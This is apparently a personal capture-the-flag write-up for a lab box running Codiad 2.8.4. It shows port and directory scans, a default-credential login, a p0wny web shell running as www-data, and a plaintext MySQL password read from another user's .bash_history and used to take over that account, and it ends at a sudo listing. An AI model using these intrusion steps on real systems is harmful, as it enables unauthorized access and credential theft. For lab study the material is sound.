## Tristan Gomez

`Gain a shell on the box and escalate your privileges!`

nmap
```
┌──(gomez22㉿DESKTOP-V2K8SJ4)-[~]
└─$ nmap -sV 10.10.120.122
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-25 13:26 PST
Nmap scan report for 10.10.120.122
Host is up (0.20s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
62337/tcp open  http       Apache httpd 2.4.29 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.88 seconds
```

* anonymous ftp is allowed. Found a file named `-`. Its contents are...
```
Hey john,
I have reset the password as you have asked. Please use the default password to login. 
Also, please take care of the image file ;)
- drac.
```

* `john` and `drac` are potential users.

gobuster
```
└─$ gobuster dir -w common.txt -x php,html,js,txt -u 10.10.120.122
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.120.122
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              html,js,txt,php
[+] Timeout:                 10s
===============================================================
2022/01/25 13:30:01 Starting gobuster in directory enumeration mode
===============================================================
/.hta.txt             (Status: 403) [Size: 278]
/.hta.php             (Status: 403) [Size: 278]
/.hta                 (Status: 403) [Size: 278]
/.hta.html            (Status: 403) [Size: 278]
/.hta.js              (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.htaccess.php        (Status: 403) [Size: 278]
/.htpasswd.php        (Status: 403) [Size: 278]
/.htaccess.html       (Status: 403) [Size: 278]
/.htpasswd.html       (Status: 403) [Size: 278]
/.htaccess.js         (Status: 403) [Size: 278]
/.htpasswd.js         (Status: 403) [Size: 278]
/.htaccess.txt        (Status: 403) [Size: 278]
/.htpasswd.txt        (Status: 403) [Size: 278]
/index.html           (Status: 200) [Size: 10918]
/index.html           (Status: 200) [Size: 10918]
/server-status        (Status: 403) [Size: 278]  

```

http://10.10.120.122:62337 -> codidad 2.8.4 login page -> john:password

```

p0wny@shell:â¦/codiad/exploit# ls
shell.php

p0wny@shell:â¦/codiad/exploit# pwd
/var/www/html/codiad/exploit

p0wny@shell:â¦/codiad/exploit# whoami
www-data

p0wny@shell:â¦/codiad/exploit# cd /home


p0wny@shell:/home# ls
drac

p0wny@shell:/home# ls -la
total 12
drwxr-xr-x  3 root root 4096 Jun 17  2021 .
drwxr-xr-x 24 root root 4096 Jul  9  2021 ..
drwxr-xr-x  6 drac drac 4096 Aug  4 07:06 drac

p0wny@shell:/home# cd drac


p0wny@shell:/home/drac# ls
user.txt

p0wny@shell:/home/drac# ls -la
total 52
drwxr-xr-x 6 drac drac 4096 Aug  4 07:06 .
drwxr-xr-x 3 root root 4096 Jun 17  2021 ..
-rw------- 1 drac drac   49 Jun 18  2021 .Xauthority
-rw-r--r-- 1 drac drac   36 Jul 11  2021 .bash_history
-rw-r--r-- 1 drac drac  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 drac drac 3787 Jul 11  2021 .bashrc
drwx------ 4 drac drac 4096 Jun 18  2021 .cache
drwxr-x--- 3 drac drac 4096 Jun 18  2021 .config
drwx------ 4 drac drac 4096 Jun 18  2021 .gnupg
drwx------ 3 drac drac 4096 Jun 18  2021 .local
-rw-r--r-- 1 drac drac  807 Apr  4  2018 .profile
-rw-r--r-- 1 drac drac    0 Jun 17  2021 .sudo_as_admin_successful
-rw------- 1 drac drac  557 Jun 18  2021 .xsession-errors
-r-------- 1 drac drac   33 Jun 18  2021 user.txt
```
p0wny@shell:/home/drac# cat user.txt
cat: user.txt: Permission denied
```

```
p0wny@shell:/home/drac# cat .bash_history
mysql -u drac -p 'Th3dRaCULa1sR3aL'
```

```
drac@ide:~$ ls
user.txt
drac@ide:~$ cat user.txt
02930d21a8eb009f6d26361b2d24a466
```

```
drac@ide:~$ sudo -l
[sudo] password for drac: 
Matching Defaults entries for drac on ide:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User drac may run the following commands on ide:
    (ALL : ALL) /usr/sbin/service vsftpd restart

```

